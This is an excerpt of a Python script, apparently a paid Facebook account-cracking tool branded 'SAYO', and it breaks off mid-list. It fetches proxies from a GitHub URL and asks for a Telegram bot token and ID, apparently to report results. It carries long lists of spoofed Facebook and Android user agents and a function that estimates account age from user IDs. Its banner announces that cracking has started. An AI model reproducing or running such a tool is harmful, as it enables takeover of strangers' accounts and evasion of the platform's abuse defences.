...
gma = response.text.strip().split("\n")

brx = random.choice(gma)
...
try:
        prox= requests.get('https://raw.githubusercontent.com/2SAYO/prox/main/prox.txt').text
...
r = '\033[1;31m'
w = '\x1b[1;97m'
sh = ['𝐖𝐨𝐰', '𝐛𝐞𝐚𝐮𝐭𝐢𝐟𝐮𝐥', '𝐲𝐨𝐮 𝐝𝐞𝐬𝐞𝐫𝐯𝐞 𝐢𝐭', '𝐢 𝐥𝐨𝐯𝐞 𝐲𝐨𝐮', '𝐢𝐦 𝐤𝐢𝐧𝐠', '𝐒𝐚𝐲𝐨 𝐋𝐨𝐯𝐞 𝐘𝐨𝐮', '𝐭𝐡𝐢𝐬 𝐢𝐬 𝐦𝐞 😎', '𝐢𝐦 𝐬𝐭𝐫𝐨𝐧𝐠 😏', '𝐇𝐨𝐩𝐞 𝐬𝐡𝐢𝐧𝐞𝐬 𝐭𝐡𝐫𝐨𝐠𝐡𝐭 𝐝𝐚𝐫𝐤 𝐭𝐢𝐦𝐞𝐬']

random_sh = random.choice(sh)
dol = random.choice(["𝐔𝐧𝐢𝐭𝐞𝐝 𝐒𝐭𝐚𝐭𝐞𝐬", "𝐂𝐡𝐢𝐧𝐚", "𝐉𝐚𝐩𝐚𝐧", "𝐆𝐞𝐫𝐦𝐚𝐧𝐲", "𝐔𝐧𝐢𝐭𝐞𝐝 𝐊𝐢𝐧𝐠𝐝𝐨𝐦", "𝐅𝐫𝐚𝐧𝐜𝐞", "𝐈𝐭𝐚𝐥𝐲", "𝐁𝐫𝐚𝐳𝐢𝐥", "𝐂𝐚𝐧𝐚𝐝𝐚", "𝐒𝐨𝐮𝐭𝐡 𝐊𝐨𝐫𝐞𝐚", "𝐑𝐮𝐬𝐬𝐢𝐚", "𝐀𝐮𝐬𝐭𝐫𝐚𝐥𝐢𝐚", "𝐒𝐩𝐚𝐢𝐧", "𝐌𝐞𝐱𝐢𝐜𝐨", "𝐍𝐞𝐭𝐡𝐞𝐫𝐥𝐚𝐧𝐝𝐬", "𝐓𝐮𝐫𝐤𝐞𝐲", "𝐒𝐰𝐢𝐭𝐳𝐞𝐫𝐥𝐚𝐧𝐝", "𝐒𝐰𝐞𝐝𝐞𝐧", "𝐏𝐨𝐥𝐚𝐧𝐝", "𝐈𝐧𝐝𝐨𝐧𝐞𝐬𝐢𝐚", "𝐓𝐚𝐢𝐰𝐚𝐧", "𝐓𝐡𝐚𝐢𝐥𝐚𝐧𝐝", "𝐀𝐫𝐠𝐞𝐧𝐭𝐢𝐧𝐚", "𝐍𝐨𝐫𝐰𝐚𝐲", "𝐃𝐞𝐧𝐦𝐚𝐫𝐤", "𝐌𝐚𝐥𝐚𝐲𝐬𝐢𝐚", "𝐏𝐡𝐢𝐥𝐢𝐩𝐩𝐢𝐧𝐞𝐬", "𝐅𝐢𝐧𝐥𝐚𝐧𝐝", "𝐇𝐮𝐧𝐠𝐚𝐫𝐲", "𝐈𝐬𝐫𝐚𝐞𝐥", "𝐏𝐨𝐫𝐭𝐮𝐠𝐚𝐥", "𝐑𝐨𝐦𝐚𝐧𝐢𝐚", "𝐈𝐫𝐞𝐥𝐚𝐧𝐝", "𝐂𝐨𝐥𝐨𝐦𝐛𝐢𝐚", "𝐒𝐢𝐧𝐠𝐚𝐩𝐨𝐫𝐞", "𝐒𝐨𝐮𝐭𝐡 𝐀𝐟𝐫𝐢𝐜𝐚", "𝐏𝐚𝐤𝐢𝐬𝐭𝐚𝐧", "𝐍𝐢𝐠𝐞𝐫𝐢𝐚", "𝐕𝐢𝐞𝐭𝐧𝐚𝐦", "𝐔𝐤𝐫𝐚𝐢𝐧𝐞"])

klt = ['𝐢𝐦 𝐬𝐨𝐫𝐫𝐲', '𝐛𝐞 𝐩𝐚𝐭𝐢𝐞𝐧𝐭', '𝐈 𝐚𝐩𝐨𝐥𝐨𝐠𝐢𝐳𝐞', '𝐲𝐨𝐮 𝐮𝐧𝐥𝐮𝐜𝐤𝐲', '𝐖𝐚𝐢𝐭 𝐦𝐨𝐦𝐞𝐧𝐭𝐬', '𝐭𝐡𝐢𝐬 𝐢𝐬 𝐲𝐨𝐮𝐫 𝐥𝐮𝐜𝐤𝐲', '𝐝𝐨 𝐧𝐨𝐭 𝐠𝐢𝐯𝐞 𝐮𝐩']

random_klt = random.choice(klt)

ansi_colors = ['\x1b[1;32m', '\x1b[1;97m', '\x1b[38;5;196m', '\x1b[1;33m', '\x1b[38;5;48m', '\x1b[38;5;50m', '\x1b[1;34m', '\x1b[38;5;14m']
lon = random.choice(ansi_colors)

def print_GA(text, delay=0.1):
...
\x1b[1;97m———————————————————————————————\033[1;41m\033[1;97m𝐒 𝐀 𝐘 𝐎\033[;0m\033[1;91m\x1b[1;97m————————————————————————————————
             ...
             \033[1;31m╠══\033[1;33m{w}𝗣{r}𝗥{w}𝗢{r}𝗚{w}𝗥{r}𝗔{w}𝗠{r}𝗠{w}𝗘{r}𝗥          \x1b[1;97m•          \u001b[38;5;35m{w}𝗦{r}𝗔{w}𝗬{r}𝗢    \033[1;31m║
             \033[1;31m╠══\033[1;33m{w}𝗧{r}𝗘{w}𝗟{r}𝗘{w}𝗚{r}𝗥{w}𝗔{r}𝗠            \x1b[1;97m•          \u001b[38;5;35m{w}𝗦{r}_{w}𝗔{r}_{w}𝗬{r}_{w}𝗢\033[1;31m ║
             \033[1;31m╠══\033[1;33m{w}𝗧{r}𝗢{w}𝗢{r}𝗟{w}𝗦               \x1b[1;97m•          \u001b[38;5;35m{r}𝗣{w}𝗔{r}𝗜{w}𝗗    \033[1;31m║
             \033[1;31m╠══\033[1;33m{w}𝗩{r}𝗘{w}𝗥{r}𝗦{w}𝗜{r}𝗢{w}𝗡             \x1b[1;97m•          \u001b[38;5;35m{r}𝗩{w}0{r}.{w}1    \033[1;31m║
             \033[1;31m╚\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m╝
...
def read_config():
    try:
        ...
        try:
            ...
            token = input(f'{w}𝐓 {r}𝐎 {w}𝐊 {r}𝐄 {w}𝐍 {r}:{w} ')
            ID = input(f'{w}𝐈 {r}𝐃 {w}: {r}')
...
JDM = '══════════𝐏 𝐀 𝐈 𝐃═══════════\n       𖥷⌥𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐓𝐎𝐎𝐋😁 \n \n       𖥷⌥𝐘𝐎𝐔𝐑 𝐁𝐎𝐓 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆🔑 \n \n       𖥷⌥𝐂𝐑𝐀𝐂𝐊𝐄𝐃 𝐒𝐓𝐀𝐑𝐓 𝐍𝐎𝐖🔥 \n══════════𝐏 𝐀 𝐈 𝐃═══════════'

video_url = "https://t.me/MANDARIN8INFO/6"

encoded_video_url = urllib.parse.quote_plus(video_url)

video_link = f'<a href="{encoded_video_url}">PAID TOOL 🔐</a>'
...
def clear():
	os.system('clear')
#------------------[ USER-AGENT ]-------------------#
RANDOM_SAYO = random.choice(['Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Samsumg;FBBD/samsung;FBDV/Note9;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)','Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
user_agent = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; Win64; x64; Trident/5.0)','Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (X11; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0)','Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Win64; x64; Trident/5.0)','Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0','Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; WOW64; Trident/4.0)','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/4.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; Trident/6.0)','Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0']
...
try:
    ...
    prox = open('.prox.txt', 'r').read().splitlines()
prox = open('.prox.txt', 'r').read().splitlines()
ua = random.choice(['[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FB4A/;FBAV/4Q095MQG;FBBV/241073505;FBAN/FB4A;FBAV/4Q095MQG;FBBV/241073505;FBDM//*{density=3.0,width=1080,height=1280};FBLC/de_DE;FBRV/772193205;FBCR/LG;FBMF/OnePlus;FBBD/Wiko;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5H;FBSV/11;FBOP/7;FBCA/arm64-v8a;FBSS/;]','[FB4A/;FBAV/;FBBV/574933331;FBAN/FB4A;FBAV/;FBBV/574933331;FBDM//*{density=1.5,width=1080,height=1920};FBLC/fr_FR;FBRV/830594421;FBCR/Realme;FBMF/OnePlus;FBBD/Meizu;FBPN/com.facebook.katana;FBDV/HTC_Drive_10;FBSV/15;FBOP/7;FBCA/arm64-v8a;FBSS/12;]','[FB4A/;FBAV/;FBBV/316554741;FBAN/FB4A;FBAV/;FBBV/316554741;FBDM//*{density=2.5,width=720,height=2560};FBLC/es_ES;FBRV/470024512;FBCR/OPPO;FBMF/Motorola;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/HTC_Drive_11;FBSV/14;FBOP/6;FBCA/armeabi-v7a;FBSS/15;]','[FBAN/;FBAV/YZWSES93;FBBV/668097315;FBAN/FBAN;FBAV/YZWSES93;FBBV/668097315;FBDM//*{density=2.5,width=720,height=1280};FBLC/zh_CN;FBRV/259934630;FBCR/OPPO;FBMF/VIVO;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Motorola_Moto_E7;FBSV/14;FBOP/7;FBCA/armeabi-v7a;FBSS/13;]','[FBAN/;FBAV/A1XDL5U4;FBBV/162809060;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/162809060;FBDM//*{density=1.5,width=720,height=2560};FBLC/zh_CN;FBRV/392182652;FBCR/LG;FBMF/OnePlus;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/LG_Q10;FBSV/13;FBOP/7;FBCA/armeabi;FBSS/;]','[FBAN/;FBAV/;FBBV/275754699;FBAN/FBAN;FBAV/;FBBV/275754699;FBDM//*{density=3.0,width=1920,height=2560};FBLC/de_DE;FBRV/684584015;FBCR/OPPO;FBMF/Xiaomi;FBBD/Alcatel;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G1200;FBSV/13;FBOP/7;FBCA/armeabi;FBSS/14;]','[FB4A/;FBAV/;FBBV/159465951;FBAN/FB4A;FBAV/;FBBV/159465951;FBDM//*{density=1.5,width=1080,height=4096};FBLC/ru_RU;FBRV/979313050;FBCR/LG;FBMF/Xiaomi;FBBD/Telenor;FBPN/com.facebook.katana;FBDV/HTC_Drive_14;FBSV/13;FBOP/5;FBCA/arm64-v8a;FBSS/;]','[FBAN/;FBAV/;FBBV/552606933;FBAN/FBAN;FBAV/;FBBV/552606933;FBDM//*{density=1.5,width=2560,height=3840};FBLC/ru_RU;FBRV/135252091;FBCR/Sony;FBMF/OnePlus;FBBD/Blu;FBPN/com.facebook.katana;FBDV/iPhone12,8;FBSV/11;FBOP/8;FBCA/x86;FBSS/;]','[FBAN/;FBAV/A1XDL5U4;FBBV/621857066;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/621857066;FBDM//*{density=2.5,width=2560,height=1280};FBLC/es_ES;FBRV/394605120;FBCR/Realme;FBMF/OnePlus;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/Nokia_X90;FBSV/16;FBOP/6;FBCA/x86_64;FBSS/13;]','[FBAN/;FBAV/4Q095MQG;FBBV/534851051;FBAN/FBAN;FBAV/4Q095MQG;FBBV/534851051;FBDM//*{density=3.0,width=1920,height=3840};FBLC/fr_FR;FBRV/940424262;FBCR/TECNO;FBMF/Apple;FBBD/HMD_Global;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N200;FBSV/13;FBOP/5;FBCA/armeabi-v7a;FBSS/;]'])
...
def creatdate(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :creatdate = '2009' 
        elif ids[:9] in ['100000000']       :creatdate = '2009' 
        elif ids[:8] in ['10000000']        :creatdate = '2009' 
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creatdate = '2009' 
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creatdate = '2010' 
        elif ids[:6] in ['100001']          :creatdate = '2010-2011'
        elif ids[:6] in ['100002','100003'] :creatdate = '2011-2012'
        elif ids[:6] in ['100004']          :creatdate = '2012-2013'
        elif ids[:6] in ['100005','100006'] :creatdate = '2013-2014'
        elif ids[:6] in ['100007','100008'] :creatdate = '2014-2015'
        elif ids[:6] in ['100009']          :creatdate = '2015' 
        elif ids[:5] in ['10001']           :creatdate = '2015-2016'
        elif ids[:5] in ['10002']           :creatdate = '2016-2017'
        elif ids[:5] in ['10003']           :creatdate = '2018-2019'
        elif ids[:5] in ['10004']           :creatdate = '2019-2020'
        elif ids[:5] in ['10005']           :creatdate = '2020' 
        elif ids[:5] in ['10006','10007','']:creatdate = '2021' 
        elif ids[:5] in ['10008']           :creatdate = '2022' 
        elif ids[:5] in ['10009']           :creatdate = '2022' 
        elif ids[:4] in ['6155']           :creatdate = '2023'        
        else:creatdate=''
...
header_grup = {'user-agent': 'Mozilla/5.0 (Linux; U; Android 18; zh-CN; MZ-meizu 17 Bui ld/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.7.6 787.(756 MZBrowser/9.14.1 Mobile Safari/537.3652 Build/FDC26V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.2583.80 Mobile Safari/537.36 HeyTapBrowser/14.7.36.1' }
...
header_grup = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1' }
header_grup = {'user-agent': 'Dalvik/2.1.0 (Linux Kernel Version: 4.4.153-BEAST; Android 9; Redmi Note 7 Build/PQ3A.190505.002)Mobile [FB_IAB/FB4A;FBAV/285.0.0.43.120;]' }
...
header_grup = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Desire R6 plus Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/287.0.0.4.117;]' }
header_grup = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1' }
header_grup = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920' }
header_grup = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Nokia 1.3 Build/QKQ1.191008.001) [FBAN/FBIOS;FBDV/Nokia6600;FBMD/Nokia;FBSN/IOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]' }
header_grup = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/12.3.2;FBSS/3;FBCR/AT&T;FBID/phone;FBLC/en_US;FBOP/5]' }
header_grup = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002' }
header_grup = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X688B Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/288.0.0.5.115;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/346850586;FBCR/TNT;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1472};]' }
header_grup = {'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build/OPM1.171019.019) [FBAN/Orca-Android;FBAV/244.0.0.16.236;FBPN/com.facebook.orca;FBLC/en_US;FBBV/187555057;FBCR/null;FBMF/LGE;FBBD/lge;FBDV/LML713DL;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};FB_FW/1;] FBBK/1' }
import random
KTR1 = (['Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Samsumg;FBBD/samsung;FBDV/Note9;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)','Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
KTR2 = (['Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X606F Build/QP1A.190711.020; BroadcastDotRadioApp )','Dalvik/2.1.0 (Linux; U; Android 10; PX4 Build/QQ2A.200305.004.A1)','Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 Build/S1RDS32.55-106-4)','Dalvik/2.1.0 (Linux; U; Android 13; M2101K6I Build/TKQ1.221013.002)','Dalvik/2.1.0 (Linux; U; Android 11; Black X Build/RP1A.200720.011)','Dalvik/2.1.0 (Linux; U; Android 13; M2007J1SC Build/TKQ1.221114.001)','Dalvik/2.1.0 (Linux; U; Android 13; T610K Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOW32.121-40)','Dalvik/2.1.0 (Linux; U; Android 8.1.0; E100 Build/OPM2.171019.012)','Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) VD/218','Dalvik/2.1.0 (Linux; U; Android 7.0; TZ742 Build/NRD90M)','Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-15)','Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6823 Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 lite Build/S2RKS32.92-11-21-13)','Dalvik/2.1.0 (Linux; U; Android 12; TECNO AD9 Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOW32.121-40)','Dalvik/2.1.0 (Linux; U; Android 12; A202ZT Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 12; moto g31(w) Build/S3RWD32.123-29-8)','Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ72 Build/61.2.G.0.41)','Dalvik/2.1.0 (Linux; U; Android 5.1.1; MID Build/LMY47V)','Dalvik/2.1.0 (Linux; U; Android 10; TOX2 Build/QP1A.191105.004)','Dalvik/2.1.0 (Linux; U; Android 12; TANK 01 Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 9; V1813T Build/P00610)','Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4 XL Build/TQ2A.230405.003.E1)','Dalvik/2.1.0 (Linux; U; Android 13; CPH2205 Build/TP1A.220905.001)','Dalvik/2.1.0 (Linux; U; Android 9; AFTTIFF43 Build/PS7633.3449N)','Dalvik/2.1.0 (Linux; U; Android 8.1.0; i75 Build/O11019)','Dalvik/2.1.0 (Linux; U; Android 12; M8L Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 12; 220733SPI Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 11; P652 Pro Build/RP1A.201005.001)','Dalvik/2.1.0 (Linux; U; Android 7.1.1; BLADE A6 Build/NMF26F)','Dalvik/2.1.0 (Linux; U; Android 6.0; X60 Plus Build/MRA58K)','Dalvik/2.1.0 (Linux; U; Android 12; L-41A Build/SKQ1.211103.001)','Dalvik/2.1.0 (Linux; U; Android 12; moto g200 5G Build/S1RXS32.50-13-5)','Dalvik/2.1.0 (Linux; U; Android 13; ASUS_AI2203_C Build/TP1A.220624.014)','Dalvik/2.1.0 (Linux; U; Android 9; AFTBOXE1 Build/PS7600.3513N)','Dalvik/2.1.0 (Linux; U; Android 11; B610A115 Build/RP1A.200720.011)','Dalvik/2.1.0 (Linux; U; Android 11; rammus Build/R112-15359.45.0)','Dalvik/2.1.0 (Linux; U; Android 12; Power Armor X11 Pro Build/SP1A.210812.016)','Dalvik/2.1.0 (Linux; U; Android 13; SM-A127F Build/TP1A.220624.014) VD/213','Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 55 Helium Plus Build/LMY47D)','Dalvik/2.1.0 (Linux; U; Android 6.0; hiPower Build/MRA58K)','Dalvik/2.1.0 (Linux; U; Android 13; RMX3562 Build/TP1A.220905.001)','Dalvik/2.1.0 (Linux; U; Android 